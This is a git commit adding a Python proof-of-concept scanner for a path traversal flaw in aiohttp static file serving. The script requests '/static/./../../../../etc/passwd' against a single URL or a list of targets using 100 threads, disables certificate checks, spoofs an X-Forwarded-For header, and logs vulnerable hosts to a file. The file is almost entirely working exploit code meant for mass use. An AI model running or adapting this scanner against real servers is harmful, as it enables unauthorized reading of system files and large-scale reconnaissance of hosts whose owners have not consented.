bbb855b04c07d31a17154ef71ba46c08b176f7d0
chenlu <155654500+luse29@users.noreply.github.com>
2024-03-14 15:15:01 +0800

    Add files via upload

---
+++ aiohttp-static.py
@@ -0,0 +1,58 @@
+import argparse,requests,sys
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="aio")
+    parser.add_argument('-u','--url',help='input url')
+    parser.add_argument('-f','--file',help='input url file')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n',''))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(print(f"Usag:\n\t python3 {sys.argv[0]} -h"))
+    
+
+def banner():
+    test = """
+ 
+ █████╗ ██╗ ██████╗ ██╗  ██╗████████╗████████╗██████╗     ███████╗████████╗ █████╗ ████████╗██╗ ██████╗
+██╔══██╗██║██╔═══██╗██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝╚══██╔══╝██╔══██╗╚══██╔══╝██║██╔════╝
+███████║██║██║   ██║███████║   ██║      ██║   ██████╔╝    ███████╗   ██║   ███████║   ██║   ██║██║     
+██╔══██║██║██║   ██║██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║   ██║   ██╔══██║   ██║   ██║██║     
+██║  ██║██║╚██████╔╝██║  ██║   ██║      ██║   ██║         ███████║   ██║   ██║  ██║   ██║   ██║╚██████╗
+╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝
+                                                                                  author:chenlu
+                                                                                  version:1.0.1                                                                                                                                                                                                
+"""
+    print(test)
+def poc(target):
+    url = target+'/static/./../../../../../../../../etc/passwd'
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate',
+        'X-Forwarded-For': 'localhost',
+        'Connection': 'close'
+    }
+    try:
+        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
+        if 'root' in res:
+            with open('result.txt','a') as f:
+                f.write(f'[+]{target} is vulnerabilities present'+'\n')
+        else:
+            print(f'[-]{target} is not vulnerabilities present')
+    except:
+        print(f'[*]{target} is server error')
+
+if __name__ == '__main__':
+    main()
